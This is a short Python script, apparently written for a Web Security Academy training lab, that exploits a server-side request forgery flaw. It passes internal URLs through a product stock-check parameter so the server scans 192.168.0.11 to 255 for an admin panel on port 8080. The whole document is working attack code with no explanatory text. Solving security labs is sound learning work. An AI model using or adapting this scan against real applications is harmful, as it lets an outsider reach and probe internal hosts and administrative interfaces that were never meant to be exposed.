import requests
import urllib.parse
base_url = "https://0ae60048046c1334808285fd0093004c.web-security-academy.net/product/stock"

# Scan remaining range
for i in range(11, 256):
    ip = f"192.168.0.{i}"
    admin_url = f"http://{ip}:8080/admin"
    encoded_admin_url = urllib.parse.quote(admin_url, safe="")
    params = {"stockApi": encoded_admin_url}
    try:
        resp = requests.get(base_url, params=params, timeout=5)
        print(f"Trying {ip}: (status, len) => {resp.status_code}, {len(resp.content)}")
        print(resp.text)

        if resp.status_code != 405:
            break
    except Exception as e:
        print(f"Exception for {ip}: {e}")
